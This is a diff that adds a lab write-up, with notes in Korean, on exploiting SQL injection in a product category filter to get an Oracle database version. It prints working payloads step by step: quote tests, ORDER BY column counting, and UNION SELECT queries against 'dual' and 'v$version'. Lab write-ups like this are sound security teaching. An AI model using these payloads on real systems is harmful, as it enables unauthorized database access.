@@ -1,0 +1,21 @@
+#Lab: SQL injection attack, querying the database type and version on Oracle
+
+This lab contains a SQL injection vulnerability in the product category filter.
+You can use a UNION attack to retrieve the results from an injected query.
+To solve the lab, display the database version string.
+
+### 🔍 분석 및 공격 과정
+1. DB의 버전을 얻어 온다. 일단 entry target은 category.
+2. 싱 쿼테이션을 넣어본다. 오류. 이번에는 쿼테이션 쌍을 맞추어준다. 정상 작동.
+ --> sql 쿼리로 작동중임.
+3. 기존의 pets를 Pe' || 'ts로 바꾸어도 웹페이지 검색결과는 바뀌지 않음. 따라서 || 가 concatenation. -> PostgreSQL 혹은 Oracle.
+4. SELECT 키워드를 이용해 version()을 가져오거나 v$version테이블로부터 banner를 가져와야함. 유니온어택
+5. 열의 수 추론 -> ORDER BY ~   -> ORDER BY 2 정상, ORDER BY 3 에러 발생
+ >>> category = 'ORDER BY 2--
+6. 이제 최종적으로 Oracle인지 Postgre인지 확인할 수 있다. 
+ >>> category = 'UNION SELECT NULL, NULL-- -> 에러
+ >>> category = ' UNION SELECT NULL, NULL FROM dual-- -> 작동.
+ --> 따라서 Oracle을 사용중임.
+7.어느 열이 문자열 데이터인지 추론. 그리고 banner 받아오기.
+ >>> category = 'UNION SELECT 'a', NULL FROM dual-- -> 작동. 첫번째 열은 스트링데이터임. 여기로 banner 받아와보자.
+ >>> category = 'UNION SELECT banner, NULL FROM v$version-- -> solve!
